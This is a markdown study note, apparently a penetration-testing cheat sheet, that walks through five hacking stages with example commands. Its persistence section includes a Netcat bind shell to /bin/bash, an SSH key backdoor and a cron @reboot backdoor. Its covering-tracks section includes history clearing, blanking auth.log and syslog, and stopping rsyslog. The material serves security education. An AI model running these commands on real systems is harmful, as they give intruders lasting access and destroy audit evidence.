# Hacking Methodology

##  The 5 Stages of Hacking
Hacking follows a structured methodology to assess and exploit security weaknesses. Below are the **five key stages** of hacking, from reconnaissance to covering tracks.

---

## 1️ Passive & Active Reconnaissance
### **Passive Reconnaissance**
- Involves gathering **information** about the target without directly interacting with it.
- **Techniques:**
  - WHOIS lookups
  - Google dorking
  - Social media profiling
  - DNS enumeration
  - Public document metadata analysis (e.g., FOCA tool)

### **Active Reconnaissance**
- Directly interacts with the target to gather information.
- **Techniques:**
  - **Ping sweeps** (`nmap -sn <target>`)
  - **Port scanning** (`nmap -sS <target>`)
  - **Service & version detection** (`nmap -sV <target>`)
  - **OS fingerprinting** (`nmap -O <target>`)

---

## 2️ Enumeration
Enumeration is the process of extracting detailed system **information**, such as usernames, shares, and services, to identify potential entry points.

### **Common Enumeration Techniques:**
- **NetBIOS Enumeration:** `nmblookup -A <target>`
- **SMB Enumeration:** `enum4linux -a <target>`
- **SNMP Enumeration:** `snmpwalk -v 2c -c public <target>`
- **DNS Zone Transfers:** `dig axfr @<target>`
- **User Enumeration on Web Apps:** Using `wfuzz` or `gobuster` for directory and file brute-forcing.

---

## 3️ Gaining Access
This phase involves **exploiting vulnerabilities** to gain unauthorized access.

### **Common Attack Vectors:**
- **Exploiting unpatched vulnerabilities** (`searchsploit <service>` to find exploits)
- **Password attacks** (Brute-force using `hydra` or `john`)
- **Web application attacks** (SQL Injection, XSS, CSRF)
- **Phishing attacks** (Social engineering to gain credentials)
- **Privilege escalation** (`sudo -l` or `linpeas.sh` for misconfigurations)

---

## 4️ Maintaining Access
Once access is gained, the next step is ensuring continued access for later use.

### **Persistence Techniques:**
- **Creating a backdoor:** Using Netcat:
  ```bash
  nc -lvnp 4444 -e /bin/bash
  ```
- **Adding SSH keys for persistence:**
  ```bash
  echo "your-public-key" >> ~/.ssh/authorized_keys
  ```
- **Installing rootkits:** (e.g., `Trojans` or `keyloggers` to maintain control)
- **Setting up scheduled tasks or cron jobs:**
  ```bash
  crontab -e
  @reboot /path/to/backdoor.sh
  ```

---

## 5️ Covering Tracks
To avoid detection, hackers remove traces of their activities.

### **Log Clearing & Evidence Removal:**
- **Clearing Bash History:**
  ```bash
  history -c && history -w
  ```
- **Clearing System Logs:**
  ```bash
  echo "" > /var/log/auth.log
  echo "" > /var/log/syslog
  ```
- **Disabling Logging:**
  ```bash
  service rsyslog stop
  ```
- **Hiding processes using `rootkits`** (e.g., `libprocesshider`)

---

##  Conclusion
Understanding the **five stages of hacking** is essential for recognizing and mitigating potential threats. Ethical professionals use these concepts to strengthen security and protect systems from real-world attacks.


